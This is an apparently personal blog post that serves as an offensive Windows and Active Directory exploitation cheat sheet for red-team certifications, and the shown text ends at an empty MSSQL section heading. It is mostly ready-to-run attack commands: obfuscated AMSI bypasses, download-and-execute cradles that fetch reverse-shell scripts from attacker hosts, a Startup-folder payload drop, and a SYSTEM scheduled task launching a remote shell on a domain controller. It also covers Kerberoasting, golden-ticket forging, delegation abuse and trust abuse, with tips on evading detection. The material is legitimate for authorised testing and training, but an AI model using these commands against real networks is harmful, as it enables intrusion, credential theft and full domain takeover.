+++
title = "Windows & Active Directory Exploitation Cheat Sheet and Command Reference"
date = "2020-11-04"
toc = true
draft = false
type = ["posts","post"]
series = ["CheatSheets"]
tags = [
    "Active Directory",
    "Windows",
    "Hacking"
]

[ author ]
  name = "Cas van Cooten"
+++

*Last update: **November 3rd, 2021***

*Updated **November 3rd, 2021**: Included several fixes and actualized some techniques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rubeus, and Mimikatz sections. Fixed some whoopsies as well* 🙃.

*Updated **June 5th, 2021**: I have made some more changes to this post based on (among others) techniques discussed in ZeroPointSecurity's 'Red Team Ops' course (for the CRTO certification). I've re-written and improved many sections. New sections have been added on DPAPI and GPO abuse. Notable changes have been made to the the sections on LAPS, AppLocker & CLM, PowerView, and Overpass-the-Hash with Rubeus. Enjoy! :)*

*Updated **March 26th, 2021**: This blog post has been updated based on some tools and techniques from Offensive Security's PEN-300 course (for the accompanying OSEP certification). Notable changes have been made in the sections on delegation, inter-forest exploitation, and lateral movement through MSSQL servers. Some other changes and clarifications have been made throughout the post.*

Since I recently completed my CRTP and CRTE exams, I decided to compile a list of my most-used techniques and commands for Microsoft Windows and Active Directory (post-)exploitation. It is largely aimed at completing these two certifications, but should be useful in a lot of cases when dealing with Windows / AD exploitation. 

That being said - it is *far from* an exhaustive list. If you feel any important tips, tricks, commands or techniques are missing from this list just get in touch. I will try to keep it updated as much as possible!

Many items of this list are shamelessly stolen from certification courses (that come highly recommended) that discuss Active Directory, such as [CRTP](https://www.alteredsecurity.com/adlab), [CRTE](https://www.alteredsecurity.com/redteamlab), [OSEP](https://www.offensive-security.com/pen300-osep/), and [CRTO](https://www.zeropointsecurity.co.uk/red-team-ops).
If you are looking for the cheat sheet and command reference I used for OSCP, please refer to [this post](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/).

*Note: I tried to highlight some poor OpSec choices for typical red teaming engagements with 🚩. I will likely have missed some though, so make sure you **understand what you are running** before you run it!*

## General

### PowerShell AMSI Bypass

Patching the Anti-Malware Scan Interface (AMSI) will help bypass AV warnings triggered when executing PowerShell scripts (or other AMSI-enabled content, such as JScript) that are marked as malicious. Do not use as-is in covert operations, as they will get flagged 🚩. Obfuscate, or even better, eliminate the need for an AMSI bypass altogether by altering your scripts to beat signature-based detection.

'Plain' AMSI bypass example:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Obfuscation example for copy-paste purposes:

```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Another bypass, which is not detected by PowerShell autologging:

```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

> More bypasses [here](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell). For obfuscation, check [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), or get a custom-generated obfuscated version at [amsi.fail](https:///amsi.fail).

### PowerShell one-liners

#### Load PowerShell script reflectively

Proxy-aware:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
```

Non-proxy aware:

```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
```

> Again, this will likely get flagged 🚩. For opsec-safe download cradles, check out [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter).

#### Load C# assembly reflectively

Ensure that the referenced class and main methods are `public` before running this. Note that a process-wide AMSI bypass may be required for this to work if the content is detected, [refer here for details](https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/).

```powershell
# Download and run assembly without arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()

# Download and run Rubeus, with arguments (make sure to split the args)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# Execute a specific method from an assembly (e.g. a DLL)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

#### Download file

```powershell
# Any version
(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")

# Powershell 4+
## You can use 'IWR' as a shorthand
Invoke-WebRequest "http://10.10.16.7/Rev.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe"
```

#### Encoded commands

Base64-encode a PowerShell command in the right format:

```powershell
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

Or, the Linux version of the above:

```bash
echo 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0
```

Encode existing script, copy to clipboard:

```powershell
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\path\to\PowerView.ps1')) | clip
```

Run it, bypassing execution policy.

```powershell
Powershell -EncodedCommand $encodedCommand
```

> If you have Nishang handy, you can use [Invoke-Encode.ps1](https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1).

## Enumeration

### AD Enumeration With PowerView

Though the below gives a good representation of the commands that usually come in most useful for me, this only scratches the surface of what PowerView can do. PowerView is available [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

```powershell
# Get all users in the current domain
Get-DomainUser | select -ExpandProperty cn

# Get all computers in the current domain
Get-DomainComputer

# Get all domains in current forest
Get-ForestDomain

# Get domain/forest trusts
Get-DomainTrust
Get-ForestTrust

# Get information for the DA group
Get-DomainGroup "Domain Admins"

# Find members of the DA group
Get-DomainGroupMember "Domain Admins" | select -ExpandProperty membername

# Find interesting shares in the domain, ignore default shares, and check access
Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC -CheckShareAccess

# Get OUs for current domain
Get-DomainOU -FullData

# Get computers in an OU
# %{} is a looping statement
Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname

# Get GPOs applied to a specific OU
Get-DomainOU *WS* | select gplink
Get-DomainGPO -Name "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"

# Get Restricted Groups set via GPOs, look for interesting group memberships forced via domain
Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName, GroupName, GroupMemberOf, GroupMembers

# Get the computers where users are part of a local group through a GPO restricted group
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName

# Find principals that can create new GPOs in the domain
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=targetdomain,DC=com" -ResolveGUIDs | ?{ $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# Find principals that can link GPOs to OUs
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier

# Get incoming ACL for a specific object
Get-DomainObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights

# Find interesting ACLs for the entire domain, show in a readable (left-to-right) format
Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft

# Get interesting outgoing ACLs for a specific user or group
# ?{} is a filter statement
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "Domain Admins"} | select ObjectDN,ActiveDirectoryRights
```

### AppLocker

Identify the local AppLocker policy. Look for exempted binaries or paths to bypass. 

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Get a remote AppLocker policy, based on the Distinguished Name of the respective Group Policy (you could identify this e.g. in BloodHound).

```powershell
Get-AppLockerPolicy -Domain -LDAP "LDAP://targetdomain.com/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},CN=Policies,CN=System,DC=targetdomain,DC=com"  | select -expandproperty RuleCollections
```

Some high-level bypass techniques:
- Use [LOLBAS](https://lolbas-project.github.io/) if only (Microsoft-)signed binaries are allowed. 
- If binaries from `C:\Windows` are allowed (default behavior), try dropping your binaries to `C:\Windows\Temp` or `C:\Windows\Tasks`. If there are no writable subdirectories but writable files exist in this directory tree, write your file to an alternate data stream (e.g. a JScript script) and execute it from there.
- Wrap your binaries in a DLL file and execute them with `rundll32` to bypass executable rules if DLL execution is not enforced (default behavior). 
- If binaries like Python are allowed, use those. If that doesn't work, try other techniques such as wrapping JScript in a HTA file or running XSL files with `wmic`.
- Otherwise elevate your privileges. AppLocker rules are most often not enforced for (local) administrative users.

### PowerShell Constrained Language Mode

Sometimes you may find yourself in a PowerShell session that enforces Constrained Language Mode (CLM). This is often the case when you're operating in an environment that enforces AppLocker (see above).

You can identify you're in constrained language mode by polling the following variable to get the current language mode. It will say `FullLanguage` for an unrestricted session, and `ConstrainedLanguage` for CLM. There are other language modes which I will not go into here.

```powershell
$ExecutionContext.SessionState.LanguageMode
```

The constraints posed by CLM will block many of your exploitations attempts as key functionality in PowerShell is blocked. Bypassing CLM is largely the same as bypassing AppLocker as discussed above. Another way of bypassing CLM is to bypass AppLocker to execute binaries that execute a custom PowerShell runspace (e.g. [Stracciatella](https://github.com/mgeeky/Stracciatella)) which will be unconstrained. 

Another quick and dirty bypass is to use in-line functions, which sometimes works. If e.g. `whoami` is blocked, try the following:

```powershell
&{whoami}
```

### LAPS

The Local Administrative Password Solution (LAPS) is Microsoft's product for managing local admin passwords in the context of an Active Directory domain. It frequently generates strong and unique passwords for the local admin users of enrolled machines. This password property and its expiry time are then written to the computer object in Active Directory. Read access to LAPS passwords is only granted to Domain Admins by default, but often delegated to special groups.

The permission `ReadLAPSPassword` grants users or groups the ability to read the `ms-Mcs-AdmPwd` property and as such get the local admin password. You can look for this property using e.g. BloodHound or PowerView. We can also use PowerView to read the password, if we know that we have the right `ReadLAPSPassword` privilege to a machine.

```powershell
Get-DomainComputer -identity LAPS-COMPUTER -properties ms-Mcs-AdmPwd
```

We can also use [LAPSToolkit.ps1](https://github.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1) to identify which machines in the domain use LAPS, and which principals are allowed to read LAPS passwords. If we are in this group, we can get the current LAPS passwords using this tool as well.

```powershell
# Get computers running LAPS, along with their passwords if we're allowed to read those
Get-LAPSComputers

# Get groups allowed to read LAPS passwords
Find-LAPSDelegatedGroups
```

## Lateral Movement

### Lateral Movement Enumeration With PowerView

```powershell
# Find existing local admin access for user (noisy 🚩)
Find-LocalAdminAccess

# Hunt for sessions of interesting users on machines where you have access (also noisy 🚩)
Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }

# Look for kerberoastable users
Get-DomainUser -SPN | select name,serviceprincipalname

# Look for AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select name

# Look for interesting ACL within the domain, filtering on a specific user or group you have compromised
## Exploitation depends on the identified ACL, some techniques are discussed in this cheat sheet
## Example for GenericWrite on user: Disable preauth or add SPN for targeted kerberoast (see below)
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "UserOrGroupToQuery"}

# Look for servers with Unconstrained Delegation enabled
## If available and you have admin privs on this server, get user TGT (see below)
Get-DomainComputer -Unconstrained

# Look for users or computers with Constrained Delegation enabled
## If available and you have user/computer hash, access service machine as DA (see below)
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

### BloodHound

Use `Invoke-BloodHound` from `SharpHound.ps1`, or use `SharpHound.exe`. Both can be run reflectively, get them [here](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors). Examples below use the PowerShell variant but arguments are identical.

```powershell
# Run all checks, including restricted groups enforced through the domain  🚩
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup

# Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts so is VERY noisy 🚩
Invoke-BloodHound -CollectionMethod LoggedOn
```

For real engagements definitely look into the [various arguments](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html) that BloodHound provides for more stealthy collection and exfiltration of data.

### Kerberoasting

#### Automatic

With PowerView:

```powershell
Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"
```

Crack the hash with Hashcat:

```bash
hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```

#### Manual

```powershell
# Request TGS for kerberoastable account (SPN)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.com"

# Dump TGS to disk
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack with TGSRepCrack
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
```

#### Targeted kerberoasting by setting SPN

We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:

```powershell
Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}
```

### AS-REP roasting

Get the hash for a roastable user (see above for hunting). Using `ASREPRoast.ps1`:

```powershell
Get-ASREPHash -UserName TargetUser
```

Crack the hash with Hashcat:

```bash
hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```

#### Targeted AS-REP roasting by disabling Kerberos pre-authentication

Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:

```powershell
Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}
```

### Token Manipulation

Tokens can be impersonated from other users with a session/running processes on the machine. Most C2 frameworks have functionality for this built-in (such as the 'Steal Token' functionality in Cobalt Strike).

#### Incognito

```powershell
# Show tokens on the machine
.\incognito.exe list_tokens -u

# Start new process with token of a specific user
.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe
```

> If you're using Meterpreter, you can use the built-in Incognito module with `use incognito`, the same commands are available.

#### Invoke-TokenManipulation

```powershell
# Show all tokens on the machine
Invoke-TokenManipulation -ShowAll

# Show only unique, usable tokens on the machine
Invoke-TokenManipulation -Enumerate

# Start new process with token of a specific user
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"

# Start new process with token of another process
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500
```

### Lateral Movement with Rubeus

We can use Rubeus to execute a technique called "Overpass-the-Hash". In this technique, instead of passing the hash directly (another technique known as Pass-the-Hash), we use the NTLM hash of an account to request a valid Kerberos ticket (TGT). We can then use this ticket to authenticate towards the domain as the target user.

```powershell
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section)
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```

Once we have a TGT as the target user, we can use services as this user in a domain context, allowing us to move laterally.

### Lateral Movement with Mimikatz

Note that Mimikatz is incredibly versatile and is discussed in multiple sections throughout this blog. Because of this, however, the binary is also very well-detected. If you need to run Mimikatz on your target (not recommended), executing a custom version reflectively is your best bet. There are also options such as [Invoke-MimiKatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) or [Safetykatz](https://github.com/GhostPack/SafetyKatz). Note that the latter is more stealthy but does not include all functionality.

```plaintext
# Overpass-the-hash (more risky than Rubeus, writes to LSASS memory)
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe

# Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands
sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe

# Golden ticket (domain admin, w/ some ticket properties to avoid detection)
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Silver ticket for a specific SPN with a compromised service / machine account
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```
> A nice overview of the SPNs relevant for offensive purposes is provided [here](https://adsecurity.org/?p=2011) (scroll down) and [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#pass-the-ticket-silver-tickets).

### Command execution with scheduled tasks

*Requires 'Host' SPN*

To create a task:

```powershell
# Mind the quotes. Use encoded commands if quoting becomes too much of a pain
schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dc.targetdomain.com /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"
```

To trigger the task:

```powershell
schtasks /RUN /TN "shell" /s dc.targetdomain.com
```

### Command execution with WMI

*Requires 'Host' and 'RPCSS' SPNs*

#### From Windows

```powershell
Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist "powershell.exe -e $encodedCommand"
```

#### From Linux

```bash
# with password
impacket-wmiexec DOMAIN/targetuser:password@172.16.4.101

# with hash
impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -hashes :e0e223d63905f5a7796fb1006e7dc594

# with Kerberos authentication (make sure your client is setup to use the right ticket, and that you have a TGS with the right SPNs)
impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -no-pass -k
```

### Command execution with PowerShell Remoting

*Requires 'CIFS' and 'HTTP' SPNs. May also need the 'WSMAN' or 'RPCSS' SPNs (depending on OS version)*

```powershell
# Create credential to run as another user (not needed after e.g. Overpass-the-Hash)
# Leave out -Credential $Cred in the below commands to run as the current user instead
$SecPassword = ConvertTo-SecureString 'VictimUserPassword' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\targetuser', $SecPassword)

# Run a command remotely (can be used on multiple machines at once)
Invoke-Command -Credential $Cred -ComputerName dc.targetdomain.com -ScriptBlock {whoami; hostname}

# Launch a session as another user (prompt for password instead, for use with e.g. RDP)
Enter-PsSession -ComputerName dc.targetdomain.com -Credential DOMAIN/targetuser

# Create a persistent session (will remember variables etc.), load a script into said session, and enter a remote session prompt
$sess = New-PsSession -Credential $Cred -ComputerName dc.targetdomain.com
Invoke-Command -Session $sess -FilePath c:\path\to\file.ps1
Enter-PsSession -Session $sess

# Copy files to or from an active PowerShell remoting session
Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess -Destination "C:\Users\public\"
```

### Unconstrained delegation

Unconstrained Delegation can be set on a *frontend service* (e.g., an IIS web server) to allow it to delegate on behalf of a user to *any service in the domain* (towards a *backend service*, such as an MSSQL database).

DACL UAC property: `TrustedForDelegation`.

#### Exploitation

With administrative privileges on a server with Unconstrained Delegation set, we can dump the TGTs for other users that have a connection. If we do this successfully, we can impersonate the victim user towards any service in the domain.

With Mimikatz:

```plaintext
sekurlsa::tickets /export
kerberos::ptt c:\path\to\ticket.kirbi
```

Or with Rubeus:

```powershell
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x5379f2 /nowrap
.\Rubeus.exe ptt /ticket:doIFSDCC[...]
```

We can also gain the hash for a domain controller machine account, if that DC is vulnerable to the printer bug. If we do this successfully, we can DCSync the domain controller (see below) to completely compromise the current domain.

On the server with Unconstrained Delegation, monitor for new tickets with Rubeus.

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

From attacking machine, entice the Domain Controller to connect using the printer bug. Binary from [here](https://github.com/leechristensen/SpoolSample).

```powershell
.\MS-RPRN.exe \\dc.targetdomain.com \\unconstrained-server.targetdomain.com
```

The TGT for the machine account of the DC should come in in the first session. We can pass this ticket into our current session to gain DCSync privileges (see below).

```powershell
.\Rubeus.exe ptt /ticket:doIFxTCCBc...
```

### Constrained delegation

Constrained delegation can be set on the *frontend server* (e.g. IIS) to allow it to delegate to *only selected backend services* (e.g. MSSQL) on behalf of the user.

DACL UAC property: `TrustedToAuthForDelegation`. This allows `s4u2self`, i.e. requesting a TGS on behalf of *anyone* to oneself, using just the NTLM password hash. This effectively allows the service to impersonate other users in the domain with just their hash, and is useful in situations where Kerberos isn't used between the user and frontend.

DACL Property: `msDS-AllowedToDelegateTo`. This property contains the SPNs it is allowed to use `s4u2proxy` on, i.e. requesting a forwardable TGS for that server based on an existing TGS (often the one gained from using `s4u2self`). This effectively defines the backend services that constrained delegation is allowed for.

**NOTE:** These properties do NOT have to exist together! If `s4u2proxy` is allowed without `s4u2self`, user interaction is required to get a valid TGS to the frontend service from a user, similar to unconstrained delegation.

#### Exploitation

In this case, we use Rubeus to automatically request a TGT and then a TGS with the `ldap` SPN to allow us to DCSync using a machine account.

```powershell
# Get a TGT using the compromised service account with delegation set (not needed if you already have an active session or token as this user)
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

# Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt

# Same as the two above steps, but access the LDAP service on the DC instead (for dcsync)
.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
```

### Resource-based constrained delegation

Resource-Based Constrained Delegation (RBCD) configures the *backend server* (e.g. MSSQL) to allow *only selected frontend services* (e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.

DACL Property: `msDS-AllowedToActOnBehalfOfOtherIdentity`.

In this scenario, `s4u2self` and `s4u2proxy` are used as above to request a forwardable ticket on behalf of the user. However, with RBCD, the KDC checks if the SPN for the requesting service (i.e., the *frontend service*) is present in the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the *backend service*. This means that the *frontend service* needs to have an SPN set. Thus, attacks against RBCD have to be performed from either a service account with SPN or a machine account.

#### Exploitation

If we compromise a *frontend service* that appears in the RBCD property of a *backend service*, exploitation is the same as with constrained delegation above. This is however not too common. 

A more often-seen attack to RBCD is when we have `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDACL` permissions to a computer object in the domain. This means we can write the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation.

```powershell
# Create a new machine account using PowerMad
New-MachineAccount -MachineAccount NewMachine -Password $(ConvertTo-SecureString 'P4ssword123!' -AsPlainText -Force)

# Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target
$sid = Get-DomainComputer -Identity NewMachine -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

# Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target
Get-DomainComputer -Identity TargetSrv | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target
.\Rubeus.exe s4u /user:NewMachine$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv.targetdomain.com /ptt
```

### Abusing domain trust

All commands must be run with DA privileges in the current domain.

Note that if you completely compromise a child domain (`currentdomain.targetdomain.com`), you can *by definition* also compromise the parent domain (`targetdomain.com`) due to the implicit trust relationship. The same counts for any trust relationship where SID filtering is disabled (see ['Abusing inter-forest trust']({{<ref "#abusing-inter-forest-trust" >}}) below).

#### Using domain trust key

From the DC, dump the hash of the `currentdomain\targetdomain$` trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain's enterprise admins group to our 'SID history'.

```plaintext
kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi
```

Pass this ticket with Rubeus.

```powershell
.\Rubeus.exe asktgs /ticket:c:\users\public\ticket.kirbi /service:LDAP/dc.targetdomain.com /dc:dc.targetdomain.com /ptt
```

We can now DCSync the target domain (see below).

#### Using krbtgt hash

From the DC, dump the krbtgt hash using e.g. DCSync or LSADump. Then, using this hash, forge an inter-realm TGT using Mimikatz, as with the previous method.

Doing this requires the SID of the current domain as the `/sid` parameter, and the SID of the target domain as part of the `/sids` parameter. You can grab these using PowerView's `Get-DomainSID`. Use a SID History (`/sids`) of `*-516` and `S-1-5-9` to disguise as the Domain Controllers group and Enterprise Domain Controllers respectively, to be less noisy in the logs.

```plaintext
kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:DC$ /groups:516 /ptt
```

> If you are having issues creating this ticket, try adding the 'target' flag, e.g. `/target:targetdomain.com`.

Alternatively, generate a domain admin ticket with SID history of enterprise administrators group in the target domain.

```
kerberos::golden /user:Administrator /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt
```

We can now immediately DCSync the target domain, or get a reverse shell using e.g. scheduled tasks.

### Abusing inter-forest trust

Since a forest is a security boundary, we can only access domain services that have been shared with the domain we have compromised (our source domain). Use e.g. BloodHound to look for users that have an account (with the same username) in both forests and try password re-use. Additionally, we can use BloodHound or PowerView to hunt for foreign group memberships between forests. The PowerView command:

```powershell
Get-DomainForeignGroupMember -domain targetdomain.com
```
 
In some cases, it is possible that SID filtering (the protection causing the above), is *disabled* between forests. If you run `Get-DomainTrust` and you see the `TREAT_AS_EXTERNAL` property, this is the case! In this case, you can abuse the forest trust like a domain trust, as described above. Note that you still can *NOT* forge a ticket for any SID between 500 and 1000 though, so you can't become DA (not even indirectly through group inheritance). In this case, look for groups that grant e.g. local admin on the domain controller or similar non-domain privileges. For more information, refer to [this blog post](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/).

To impersonate a user from our source domain to access services in a foreign domain, we can do the following. Extract inter-forest trust key as in ['Using domain trust key']({{<ref "#using-domain-trust-key" >}}) above.

Use Mimikatz to generate a TGT for the target domain using the trust key:

```plaintext
Kerberos::golden /user:Administrator /service:krbtgt /domain:currentdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /target:targetdomain.com /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:ticket.kirbi
```

Then, use Rubeus to ask a TGS for e.g. the `CIFS` service on the target DC using this TGT.

```powershell
.\Rubeus.exe asktgs /ticket:c:\ad\tools\eucorp-tgt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```

Now we can use the CIFS service on the target forest's DC as the DA of our source domain (again, as long as this trust was configured to exist).

### Abusing MSSQL databases for lateral movement

